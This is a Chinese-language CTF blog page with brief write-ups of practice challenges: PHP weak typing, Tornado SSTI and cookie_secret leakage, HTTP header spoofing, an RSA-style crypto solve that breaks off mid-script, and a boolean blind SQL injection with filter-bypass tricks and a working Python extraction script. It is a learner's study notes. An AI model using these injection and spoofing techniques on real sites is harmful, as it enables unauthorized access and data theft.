<h5 id="依赖于适配器类创建匿名类"><a href="#依赖于适配器类创建匿名类" class="headerlink" title="依赖于适配器类创建匿名类"></a>依赖于适配器类创建匿名类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">        组件名.addXXListener(<span class="keyword">new</span> XXAdapter()&#123;</span><br><span class="line">            <span class="comment">//重写关注事件的相应方法</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>期末考试临时冲的hhhh</p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/11/30/backupfile/">
      BackupFile[ACTF2020 新生赛]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/web/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>web</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Nov 30, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/11/30/backupfile/" class="leancloud_visitors" data-flag-title="BackupFile[ACTF2020 新生赛]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>常见的源码泄露</li>
<li>php弱类型</li>
</ul>
<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>备份文件index.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>php弱类型:int和string无法直接比较，php将string转换为int再进行比较，转换方法：该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
<p>故使用get传参 key=123即可得到flag</p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/11/30/hackworld/">
      Hack World[CISCN2019 华北赛区 Day2 Web1]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/web/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>web</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Nov 30, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/11/30/hackworld/" class="leancloud_visitors" data-flag-title="Hack World[CISCN2019 华北赛区 Day2 Web1]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11435298.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11435298.html</a></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>空格绕过</li>
<li>bool盲注二分查找</li>
</ul>
<h2 id="学到的新知识"><a href="#学到的新知识" class="headerlink" title="学到的新知识"></a>学到的新知识</h2><ul>
<li><p>空格被过滤可以使用tab</p>
<p>空格的绕过:<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>或者直接tab</p>
</li>
<li><p>由于-被过滤，所以无法检测为什么类型的注入，可以通过2/1，1/1判断为数字型注入</p>
</li>
<li><p>mysql中if()函数的使用: 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p>
<p>if(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p>
<p>则返回expr3的值。</p>
</li>
</ul>
<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>使用burpsuite进行fuzz测试，发现还是Too many requests（复现平台有waf，一秒只能访问一次）</p>
<p>找到的本题源码，萌新学习一下php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser = <span class="string">'root'</span>;</span><br><span class="line">$dbpass = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'||'</span>, <span class="string">'#'</span>, <span class="string">'-'</span>, <span class="string">';'</span>, <span class="string">'&amp;'</span>, <span class="string">'+'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'`'</span>, <span class="string">'"'</span>, <span class="string">'insert'</span>, <span class="string">'group'</span>, <span class="string">'limit'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'*'</span>, <span class="string">'into'</span>, <span class="string">'union'</span>, <span class="string">'load_file'</span>, <span class="string">'outfile'</span>, <span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($blackList <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($sql, $blackitem)) &#123;<span class="comment">//在id中查找黑名单中的字符</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>, $dbuser, $dbpass);<span class="comment">//面向过程连接mysql</span></span><br><span class="line"><span class="keyword">if</span> (!$db) &#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>, $db);<span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (safe($id)) &#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);<span class="comment">//进行查询</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($query) &#123;</span><br><span class="line">        $result = mysql_fetch_array($query);<span class="comment">//数组化显示查询结果，此处返回的数组应该是MYSQLI_ASSOC</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用的注入语句<code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code>第一次接触注入脚本，直接copy一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://64ed7296-9aea-43ac-84ec-24e5c6f616a7.node1.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select      flag    from    flag),%d,1))&gt;%d,1,2)"</span> % (x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/11/30/easy-tornado/">
      easy_tornado[护网杯 2018]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/web/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>web</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Nov 30, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/11/30/easy-tornado/" class="leancloud_visitors" data-flag-title="easy_tornado[护网杯 2018]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>发现三个文件，点开后发现访问文件需要对应的文件名和md5值</p>
<p>flag.txt中提示 flag in /fllllllllllllag  知道文件名为 /fllllllllllllag</p>
<p>(这里还以为flag在 /fllllllllllllag路径下的flag.txt，原来是包含flag的文件TnT</p>
<p>hints.txt发现对应md5值生成方法md5(cookie_secret+md5(filename))</p>
<p>得想办法知道cookie_secret</p>
<p>由于之前直接访问file?filename=/fllllllllllllag 会报错，然后看wp知道会直接显示msg的内容</p>
<p>这时候直接/error?msg=得到cookie_secret</p>
<p><code>hashlib.md5(b&#39;9d25ecb4-2999-47e8-b766-0154e448e7b9&#39;+hashlib.md5(b&#39;/fllllllllllllag&#39;).hexdigest().encode()).hexdigest()</code>得到最终md5值</p>
<p>访问传filename值和对应的md5值即可获得flag</p>
<h2 id="tornado的SSTI-模版注入"><a href="#tornado的SSTI-模版注入" class="headerlink" title="tornado的SSTI(模版注入)"></a>tornado的SSTI(模版注入)</h2><p>学习出处:</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p><a href="https://www.cnblogs.com/jingqi/p/8024873.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingqi/p/8024873.html</a></p>
<p><strong>使用render方法渲染模板</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.render(<span class="string">'tmep_index.html'</span>)</span><br></pre></td></tr></table></figure>
<p>在tornado模板中，存在一些可以访问的快速对象，比如 { {escape(handler.settings[“cookie”])} }，这个其实就是handler.settings对象，里面存储着一些环境变量</p>
<p>{ { } }  表达式用双大括号包围，内容可以是任何python表达式 ，在双大括号中的单词是占位符，双大括号中放置变量名或表达式，变量名与传入的关键字参数名要相同(如果不使用{ { } }表达式，直接显示输入的字符串</p>
<hr>
<p>这里大括号都隔开了是因为hexo的蜜汁报错(Nunjucks Errors ),Nunjucks会把大括号识别为自己的语法</p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/09/16/Http/">
      Http[极客大挑战 2019]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/web/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>web</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Sep 16, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/09/16/Http/" class="leancloud_visitors" data-flag-title="Http[极客大挑战 2019]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <p>使用burpsuite抓包看到Secret.php</p>
<p>显示It doesn’t come from ‘<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a>‘</p>
<p>学到了请求首部字段</p>
<p>Referer 告知请求的原始资源的URI，可以看出请求URI是从哪个页面发出的</p>
<p>把请求包发送到重发器 修改头部Referer为 <a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p>
<p>显示Please use “Syclover” browser</p>
<p>继续学到User-Agent字段</p>
<p>User-Agent  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1 创建请求的浏览器和用户代理名称等信息</p>
<p>显示No!!! you can only read this locally!!!</p>
<p>要伪造ip，在headers里添加 X-Forwarded-For</p>
<blockquote>
<p>X-Forwarded-For</p>
<p>X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中.</p>
</blockquote>
<p>得到flag flag{a5e3eef1-e0d8-426c-acb7-18b094653f29}</p>
<p>学习出处：<a href="https://www.dazhuanlan.com/2020/03/10/5e670ce66256d/?__cf_chl_jschl_tk__=45aa12cf90d9c0c25eef9918a873d6f7d17f4441-1600263258-0-AaivmMLCayRCIlZxXmdU78F6O6L0iO32tcd-YfB_AcQw_IIxxXasK1QPOGSEQN89atHKD6IE9Oi9JfZNPH5TEPGmnhwDY7BaZ27QsW5tGP46_vv8gPBTZrIKfTDbf7w0iXhcP-e5cD037gL-ZnalH9u8XwVnc4PD3ylRPljIdKMEPVucsXG2SCxTVMZV9NfthOwT5mQrqzolzaSiXNeCzeWWq69W3-gUdL8TgrJWfoMmyUpzfzvpcDAysJ9IFBFxIzSxM-ZLEey-25_3QIFbUNQ3ipoGHh_HMIDgaMbcrudEiJLf_tfQQ1-jDuutjGMw1g" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/10/5e670ce66256d/?__cf_chl_jschl_tk__=45aa12cf90d9c0c25eef9918a873d6f7d17f4441-1600263258-0-AaivmMLCayRCIlZxXmdU78F6O6L0iO32tcd-YfB_AcQw_IIxxXasK1QPOGSEQN89atHKD6IE9Oi9JfZNPH5TEPGmnhwDY7BaZ27QsW5tGP46_vv8gPBTZrIKfTDbf7w0iXhcP-e5cD037gL-ZnalH9u8XwVnc4PD3ylRPljIdKMEPVucsXG2SCxTVMZV9NfthOwT5mQrqzolzaSiXNeCzeWWq69W3-gUdL8TgrJWfoMmyUpzfzvpcDAysJ9IFBFxIzSxM-ZLEey-25_3QIFbUNQ3ipoGHh_HMIDgaMbcrudEiJLf_tfQQ1-jDuutjGMw1g</a></p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/09/16/Fast/">
      Fast[V&N2020 公开赛]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/BUU%E5%88%B7%E9%A2%98/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>BUU刷题</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Sep 16, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/09/16/Fast/" class="leancloud_visitors" data-flag-title="Fast[V&N2020 公开赛]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <p>学习出处：<a href="http://element-ui.cn/article/show-13917.aspx" target="_blank" rel="noopener">http://element-ui.cn/article/show-13917.aspx</a></p>
<h2 id="p与q推理"><a href="#p与q推理" class="headerlink" title="p与q推理"></a>p与q推理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g, r1, r2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">g1 = pow(g, r1 * (p<span class="number">-1</span>), N)</span><br><span class="line">g2 = pow(g, r2 * (q<span class="number">-1</span>), N)</span><br></pre></td></tr></table></figure>
<p>$g^{r_1*(p-1)} \equiv g_1 \bmod N$</p>
<p>$ g^{r_1(p-1)}=kN+g_1 $</p>
<p>$g^{r_1*(p-1)}\equiv g_1 \bmod p$</p>
<p>由于费马小定理</p>
<p>如果p是一个<a href="https://baike.baidu.com/item/质数/263515" target="_blank" rel="noopener">质数</a>，而整数a不是p的倍数，则有$a^{p-1} \equiv 1 \bmod p$</p>
<p>推出$g^{r_1*(p-1)}\bmod p \equiv 1$</p>
<p>故$g_1 \equiv 1 \bmod p$</p>
<p>同理$g_2 \equiv 1 \bmod q$</p>
<p>gcd($g_1$-1,N)与gcd($g_2$,N)求出p,q</p>
<h2 id="解密函数推理"><a href="#解密函数推理" class="headerlink" title="解密函数推理"></a>解密函数推理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    s1, s2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>)]</span><br><span class="line">    c1 = (m * pow(g1, s1, N)) % N</span><br><span class="line">    c2 = (m * pow(g2, s2, N)) % N</span><br><span class="line">    <span class="keyword">return</span> (c1, c2)</span><br></pre></td></tr></table></figure>
<p>加密函数如上所示</p>
<p>$c_1=((m\bmod N)(g_1^{s_1}\bmod N))\bmod N$</p>
<p>$c_1=(m*g_1^{s_1})\bmod N$</p>
<p>$c_1=kN+mg_1^{s_1}$</p>
<p>$c_1 \bmod p=(m*g_1^{s_1}) \bmod p$</p>
<p>由于$g_1 \equiv 1 \bmod p$</p>
<p>$c_1 \equiv m\bmod p$</p>
<p>同理$c_2 \equiv m\bmod q$</p>
<p>使用中国剩余定理即可求解m</p>
<p>解密函数如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c1, c2)</span>:</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1 = <span class="number">9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line">g2 = <span class="number">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line">n = <span class="number">18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line">c1, c2 = (</span><br><span class="line">    <span class="number">3976514029543484086411168675941075541422870678409709261442618832911574665848843566949154289825219682094719766762966082440586568781997199077781276145091509192208487682443007457513002005089654365915817414921574344557570444253187757317116858499013550050579856269915915792827620535138057468531410166908365364129001407147467636145589396570815405571923148902993581000542566387654639930651683044853608873583911638108204074537952317056718986683846742909366072461130053275195290631718363272923316002049685111871888148244026652658482359335651889139243735138819453744763293112267738369048641158946411500606588429007794613880534</span>,</span><br><span class="line">    <span class="number">18524535479582837341745231233387403662294605513261199630593257391163433751052467785080620993007681605662927226603747560698627838567782891522546977611597418150309028806158429831471152782211111046118637630899456903846057977815397285171313888516791822545633820066408276065732715348834255021260666966934592884548856831383262013360819013814149529393178712576141627031723067564594282618223686778534522328204603249125537258294561872667849498796757523663858312311082034700705599706428944071848443463999351872482644584735305157234751806369172212650596041534643187402820399145288902719434158798638116870325144146218568810928344</span></span><br><span class="line">)</span><br><span class="line">p = gcd(g1 - <span class="number">1</span>, n)</span><br><span class="line">q = 